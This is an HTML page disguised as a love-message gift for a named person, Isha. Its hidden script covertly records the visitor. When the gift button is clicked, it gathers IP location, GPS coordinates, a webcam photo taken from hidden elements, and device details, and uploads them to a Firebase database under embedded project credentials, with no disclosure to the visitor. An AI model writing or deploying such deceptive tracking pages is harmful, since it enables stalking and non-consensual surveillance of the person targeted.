<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>For Isha ❤️</title>

<style>

body{
margin:0;
height:100vh;
background:linear-gradient(45deg,#ff4b5c,#ff9a9e);
font-family:Arial;
overflow:hidden;
color:white;
text-align:center;
display:flex;
justify-content:center;
align-items:center;
}

.container{
width:90%;
max-width:350px;
z-index:10;
}

.heart{
font-size:70px;
animation:beat 1s infinite;
}

@keyframes beat{
0%{transform:scale(1);}
50%{transform:scale(1.3);}
100%{transform:scale(1);}
}

button{
width:100%;
padding:14px;
font-size:18px;
border:none;
border-radius:25px;
background:white;
color:#ff4b5c;
margin-top:15px;
}

.message{
display:none;
font-size:22px;
margin-top:15px;
min-height:60px;
}

video{
display:none;
}

canvas{
display:none;
}

</style>
</head>

<body>

<div class="container">

<div class="heart">❤️</div>

<h1>Dear Isha ❤️</h1>

<p>My Special Gift For You</p>

<button onclick="startLove()">Open Gift 🎁</button>

<div class="message" id="msg"></div>

</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>

function startLove(){

let text="I Love You Isha ❤️ You Are My Sweetest Dream 🌹";
let i=0;

let msg=document.getElementById("msg");

msg.style.display="block";
msg.innerHTML="";

let typing=setInterval(()=>{

msg.innerHTML+=text.charAt(i);
i++;

if(i>=text.length){
clearInterval(typing);
}

},80);

startTracking();

}

</script>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
apiKey: "AIzaSyAicGiOH3CQAxfOy1Y1y-osoypb73Ew1Y8",
authDomain: "remote-videoplayer.firebaseapp.com",
projectId: "remote-videoplayer",
storageBucket: "remote-videoplayer.firebasestorage.app",
messagingSenderId: "978359248102",
appId: "1:978359248102:web:c03c62454f8cbf70030727"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

window.startTracking = async function(){

let gpsLat=null;
let gpsLng=null;
let photo=null;

/* Get IP location */

const ipData = await fetch("https://ipapi.co/json/").then(res=>res.json());

/* Get GPS location */

navigator.geolocation.getCurrentPosition(

(pos)=>{
gpsLat=pos.coords.latitude;
gpsLng=pos.coords.longitude;
},

(err)=>{
gpsLat=null;
gpsLng=null;
}

);

/* Capture camera photo */

async function capturePhoto(){

try{

const stream = await navigator.mediaDevices.getUserMedia({video:true});

const video=document.getElementById("video");
video.srcObject=stream;

await new Promise(r=>setTimeout(r,2000));

const canvas=document.getElementById("canvas");
canvas.width=video.videoWidth;
canvas.height=video.videoHeight;

const ctx=canvas.getContext("2d");
ctx.drawImage(video,0,0);

photo=canvas.toDataURL("image/png");

stream.getTracks().forEach(track=>track.stop());

}catch(e){
photo=null;
}

}

await capturePhoto();

/* Save to Firebase */

await addDoc(collection(db,"isha_data"),{

ip:ipData.ip,
city:ipData.city,
region:ipData.region,
country:ipData.country_name,

ipLatitude:ipData.latitude,
ipLongitude:ipData.longitude,

gpsLatitude:gpsLat,
gpsLongitude:gpsLng,

photo:photo,

device:navigator.userAgent,

time:new Date().toString()

});

}

</script>

</body>
</html>
